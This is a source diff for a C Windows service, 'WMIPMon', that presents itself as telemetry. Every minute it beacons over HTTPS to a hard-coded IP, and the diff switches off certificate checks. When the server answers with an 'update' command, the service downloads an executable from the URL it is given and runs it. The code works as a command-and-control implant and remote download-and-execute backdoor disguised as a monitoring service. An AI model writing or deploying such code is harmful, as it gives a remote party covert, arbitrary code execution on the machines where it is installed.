@@ -2,72 +2,79 @@
 #include <wininet.h>
 #include <stdio.h>
 #include <string.h>
-#include <rpc.h>  // For UUID generation
-#include "cJSON.h"  // Make sure cJSON.h is included (from the cJSON library)
+#include <rpc.h>
+#include "cJSON.h"
 
 #define SERVICE_NAME "WMIPMon"
-#define TARGET_URL "http://10.113.210.251"
+#define TARGET_HOST "10.113.210.251"
 #define TARGET_HTTP_PORT 8888
-#define INTERVAL_MS (1 * 60 * 1000)  // 1 minute
+#define INTERVAL_MS (1 * 60 * 1000)
 
-SERVICE_STATUS        g_ServiceStatus = { 0 };
+SERVICE_STATUS g_ServiceStatus = { 0 };
 SERVICE_STATUS_HANDLE g_StatusHandle = NULL;
-HANDLE                g_ServiceStopEvent = NULL;
+HANDLE g_ServiceStopEvent = NULL;
 
-// Function declarations
 void WINAPI ServiceMain(DWORD argc, LPTSTR* argv);
 void WINAPI ServiceCtrlHandler(DWORD CtrlCode);
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam);
-void MakeHttpPostRequestAndParseJSON(void);
-//void LogJsonResponseToFile(const char* jsonResponse); //probably remove in final
+void MakeHttpsPostRequestAndParseJSON(void);
+void LogJsonResponseToFile(const char* jsonResponse);
+void LogAppStatus(const char* AppStatus);
 BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize);
 
-//global variables because I suck at passing variables between functions
 char g_Uuid[64] = { 0 };
 
-#pragma comment(lib, "advapi32.lib") //windos API functions
-#pragma comment(lib, "wininet.lib") //windows networking functions
-#pragma comment(lib, "shell32.lib") //needed for shell functions
-//#pragma comment(lib, "User32.lib") //needed for message box
-#pragma comment(lib, "Rpcrt4.lib")  // For UuidCreate and UuidToString
+#pragma comment(lib, "advapi32.lib")
+#pragma comment(lib, "wininet.lib")
+#pragma comment(lib, "shell32.lib")
+#pragma comment(lib, "Rpcrt4.lib")
 
-
-//probably remove the following in final
-/*
 void LogJsonResponseToFile(const char* jsonResponse) {
     FILE* logFile = fopen("C:\\Users\\Seth\\Desktop\\response_log.txt", "a");
-    if (logFile == NULL) {
-        printf("Failed to open log file for writing.\n");
-        return;
-    }
-
-    fprintf(logFile, "%s\n", jsonResponse); // Write the response followed by newline
+    if (!logFile) return;
+    fprintf(logFile, "%s\n", jsonResponse);
     fclose(logFile);
 }
-*/
-//probably remove the above in final
+
+void LogAppStatus(const char* AppStatus) {
+    FILE* logFile = fopen("C:\\Users\\Seth\\Desktop\\app_log.txt", "a");
+    if (!logFile) return;
+    fprintf(logFile, "%s\n", AppStatus);
+    fclose(logFile);
+}
 
 int DownloadFile(const char* url, const char* outputFile) {
+    char logMsg[512];
+    LogAppStatus("DownloadFile: Entered function");
+
     HINTERNET hInternet = InternetOpen("MyDownloader", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) {
-        printf("InternetOpen failed\n");
+        snprintf(logMsg, sizeof(logMsg), "InternetOpen failed: %lu", GetLastError());
+        LogAppStatus(logMsg);
         return 1;
     }
 
     HINTERNET hFile = InternetOpenUrl(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hFile) {
-        printf("InternetOpenUrl failed\n");
+        snprintf(logMsg, sizeof(logMsg), "InternetOpenUrl failed for URL %s: %lu", url, GetLastError());
+        LogAppStatus(logMsg);
         InternetCloseHandle(hInternet);
         return 1;
     }
 
+    snprintf(logMsg, sizeof(logMsg), "Opening file for writing: %s", outputFile);
+    LogAppStatus(logMsg);
+
     FILE* file = fopen(outputFile, "wb");
     if (!file) {
-        printf("Failed to open file for writing\n");
+        snprintf(logMsg, sizeof(logMsg), "Failed to open file for writing: %s", outputFile);
+        LogAppStatus(logMsg);
         InternetCloseHandle(hFile);
         InternetCloseHandle(hInternet);
         return 1;
     }
+
+    LogAppStatus("Begin reading from InternetReadFile");
 
     char buffer[4096];
     DWORD bytesRead;
@@ -75,16 +82,28 @@ int DownloadFile(const char* url, const char* outputFile) {
         fwrite(buffer, 1, bytesRead, file);
     }
 
-    printf("Download complete.\n");
-
     fclose(file);
     InternetCloseHandle(hFile);
     InternetCloseHandle(hInternet);
 
-    ShellExecute(NULL, "open", outputFile, NULL, NULL, SW_SHOWNORMAL);
+    snprintf(logMsg, sizeof(logMsg), "Download complete. File saved to: %s", outputFile);
+    LogAppStatus(logMsg);
 
+    // Launch downloaded file
+    STARTUPINFOA si = { sizeof(si) };
+    PROCESS_INFORMATION pi = { 0 };
+
+    if (!CreateProcessA(outputFile, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+        snprintf(logMsg, sizeof(logMsg), "CreateProcess failed: %lu", GetLastError());
+        LogAppStatus(logMsg);
+        return 1;
+    }
+
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
     return 0;
 }
+
 
 BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
     if (!outUuid || outUuidSize < 1) return FALSE;
@@ -96,27 +115,13 @@ BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
     CHAR uuidStr[64] = { 0 };
     DWORD dataSize = sizeof(uuidStr);
 
-    LONG result = RegCreateKeyExA(
-        HKEY_LOCAL_MACHINE,
-        subKey,
-        0,
-        NULL,
-        REG_OPTION_NON_VOLATILE,
-        KEY_READ | KEY_WRITE,
-        NULL,
-        &hKey,
-        &disposition
-    );
-
-    if (result != ERROR_SUCCESS) {
-        return FALSE;
-    }
+    LONG result = RegCreateKeyExA(HKEY_LOCAL_MACHINE, subKey, 0, NULL, 0, KEY_READ | KEY_WRITE, NULL, &hKey, &disposition);
+    if (result != ERROR_SUCCESS) return FALSE;
 
     result = RegQueryValueExA(hKey, valueName, NULL, NULL, (LPBYTE)uuidStr, &dataSize);
-
     if (result == ERROR_SUCCESS && uuidStr[0] != '\0') {
         strncpy(outUuid, uuidStr, outUuidSize - 1);
-        outUuid[outUuidSize - 1] = '\0';  // Ensure null termination
+        outUuid[outUuidSize - 1] = '\0';
     }
     else {
         UUID uuid;
@@ -124,7 +129,6 @@ BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
             RegCloseKey(hKey);
             return FALSE;
         }
-
         RPC_CSTR strUuid = NULL;
         if (UuidToStringA(&uuid, &strUuid) == RPC_S_OK) {
             RegSetValueExA(hKey, valueName, 0, REG_SZ, strUuid, (DWORD)strlen((char*)strUuid) + 1);
@@ -142,7 +146,7 @@ BOOL CheckOrCreateUUID(char* outUuid, DWORD outUuidSize) {
     return TRUE;
 }
 
-void MakeHttpPostRequestAndParseJSON(void) {
+void MakeHttpsPostRequestAndParseJSON(void) {
     char responseBuffer[4096];
     DWORD bytesRead;
 
@@ -160,26 +164,32 @@ void MakeHttpPostRequestAndParseJSON(void) {
     // Step 2: Open internet connection
     HINTERNET hInternet = InternetOpen("WebPostService", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
     if (!hInternet) {
-        printf("InternetOpen failed: %lu\n", GetLastError());
         cJSON_Delete(json);
         free(postData);
         return;
     }
 
-    // Step 3: Connect to host (hostname/IP only)
-    HINTERNET hConnect = InternetConnect(hInternet, "10.113.210.251", TARGET_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
+    // Step 3: Connect to HTTPS host
+    HINTERNET hConnect = InternetConnect(hInternet, TARGET_HOST, INTERNET_DEFAULT_HTTPS_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
     if (!hConnect) {
-        printf("InternetConnect failed: %lu\n", GetLastError());
         InternetCloseHandle(hInternet);
         cJSON_Delete(json);
         free(postData);
         return;
     }
 
-    // Step 4: Open HTTP POST request
-    HINTERNET hRequest = HttpOpenRequest(hConnect, "POST", "/telemetry", NULL, NULL, NULL, INTERNET_FLAG_RELOAD, 0);
+    // Step 4: Create HTTPS POST request
+    HINTERNET hRequest = HttpOpenRequest(
+        hConnect,
+        "POST",
+        "/telemetry/",
+        NULL,
+        NULL,
+        NULL,
+        INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE | INTERNET_FLAG_RELOAD,
+        0
+    );
     if (!hRequest) {
-        printf("HttpOpenRequest failed: %lu\n", GetLastError());
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
         cJSON_Delete(json);
@@ -187,10 +197,15 @@ void MakeHttpPostRequestAndParseJSON(void) {
         return;
     }
 
-    // Step 5: Send POST request
+    // Step 5: Ignore SSL certificate issues
+    DWORD flags = SECURITY_FLAG_IGNORE_UNKNOWN_CA |
+        SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
+        SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
+    InternetSetOption(hRequest, INTERNET_OPTION_SECURITY_FLAGS, &flags, sizeof(flags));
+
+    // Step 6: Send HTTPS POST request
     BOOL result = HttpSendRequest(hRequest, headers, -1L, (LPVOID)postData, postDataLen);
     if (!result) {
-        printf("HttpSendRequest failed: %lu\n", GetLastError());
         InternetCloseHandle(hRequest);
         InternetCloseHandle(hConnect);
         InternetCloseHandle(hInternet);
@@ -199,42 +214,30 @@ void MakeHttpPostRequestAndParseJSON(void) {
         return;
     }
 
-    // Step 6: Read response
+    // Step 7: Read and parse the response
     if (InternetReadFile(hRequest, responseBuffer, sizeof(responseBuffer) - 1, &bytesRead) && bytesRead > 0) {
         responseBuffer[bytesRead] = '\0';
-        printf("Response: %s\n", responseBuffer);
+        LogJsonResponseToFile(responseBuffer);
 
-        // Step 7: Parse JSON response
         cJSON* responseJson = cJSON_Parse(responseBuffer);
         if (responseJson) {
             cJSON* command = cJSON_GetObjectItemCaseSensitive(responseJson, "command");
             cJSON* parameters = cJSON_GetObjectItemCaseSensitive(responseJson, "parameters");
 
             if (cJSON_IsString(command) && cJSON_IsString(parameters)) {
-                printf("Command: %s\n", command->valuestring);
-                printf("Parameters: %s\n", parameters->valuestring);
-
                 if (strcmp(command->valuestring, "update") == 0) {
-                    // Call your download function with the given URL
-                    DownloadFile(parameters->valuestring, "downloaded_file.exe");
+                    char tempPath[MAX_PATH];
+                    GetTempPathA(MAX_PATH, tempPath);
+                    strcat(tempPath, "downloaded_file.exe");
+                    DownloadFile(parameters->valuestring, tempPath);
                 }
-                // else if (...) handle other commands here
-            }
-            else {
-                printf("Invalid or missing command/parameters in JSON\n");
             }
 
             cJSON_Delete(responseJson);
         }
-        else {
-            printf("Error parsing JSON response\n");
-        }
-    }
-    else {
-        printf("Error reading response or no data received: %lu\n", GetLastError());
     }
 
-    // Step 8: Clean up
+    // Cleanup
     InternetCloseHandle(hRequest);
     InternetCloseHandle(hConnect);
     InternetCloseHandle(hInternet);
@@ -245,78 +248,49 @@ void MakeHttpPostRequestAndParseJSON(void) {
 
 DWORD WINAPI ServiceWorkerThread(LPVOID lpParam) {
     while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0) {
-        MakeHttpPostRequestAndParseJSON();
+        MakeHttpsPostRequestAndParseJSON();
         Sleep(INTERVAL_MS);
     }
     return 0;
 }
 
 void WINAPI ServiceCtrlHandler(DWORD CtrlCode) {
-    switch (CtrlCode) {
-    case SERVICE_CONTROL_STOP:
-        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING)
-            break;
-
+    if (CtrlCode == SERVICE_CONTROL_STOP) {
+        if (g_ServiceStatus.dwCurrentState != SERVICE_RUNNING) return;
         g_ServiceStatus.dwControlsAccepted = 0;
         g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING;
         g_ServiceStatus.dwWin32ExitCode = 0;
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
-
         SetEvent(g_ServiceStopEvent);
-        break;
-    default:
-        break;
     }
 }
 
 void WINAPI ServiceMain(DWORD argc, LPTSTR* argv) {
     g_StatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
-
-    if (!g_StatusHandle)
-        return;
+    if (!g_StatusHandle) return;
 
     g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     g_ServiceStatus.dwCurrentState = SERVICE_START_PENDING;
-    g_ServiceStatus.dwControlsAccepted = 0;
-    g_ServiceStatus.dwWin32ExitCode = 0;
-    g_ServiceStatus.dwServiceSpecificExitCode = 0;
-    g_ServiceStatus.dwCheckPoint = 0;
-
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
     g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
-
-    if (g_ServiceStopEvent == NULL) {
-        g_ServiceStatus.dwControlsAccepted = 0;
+    if (!g_ServiceStopEvent) {
         g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-        g_ServiceStatus.dwWin32ExitCode = GetLastError();
         SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
         return;
     }
 
-    // --- Call CheckOrCreateUUID here ---
-    if (CheckOrCreateUUID(g_Uuid, sizeof(g_Uuid))) {
-        printf("UUID: %s\n", g_Uuid);
-    }
-    else {
-        printf("Failed to retrieve or create UUID\n");
-    }
+    if (!CheckOrCreateUUID(g_Uuid, sizeof(g_Uuid))) return;
 
     g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP;
     g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
-    g_ServiceStatus.dwWin32ExitCode = 0;
-    g_ServiceStatus.dwCheckPoint = 0;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 
     HANDLE hThread = CreateThread(NULL, 0, ServiceWorkerThread, NULL, 0, NULL);
     WaitForSingleObject(hThread, INFINITE);
 
     CloseHandle(g_ServiceStopEvent);
-
-    g_ServiceStatus.dwControlsAccepted = 0;
     g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
-    g_ServiceStatus.dwWin32ExitCode = 0;
-    g_ServiceStatus.dwCheckPoint = 3;
     SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
 }
 
@@ -326,9 +300,6 @@ int main(void) {
         {NULL, NULL}
     };
 
-    if (!StartServiceCtrlDispatcher(ServiceTable)) {
-        printf("StartServiceCtrlDispatcher failed (%lu)\n", GetLastError());
-    }
-
+    StartServiceCtrlDispatcher(ServiceTable);
     return 0;
 }
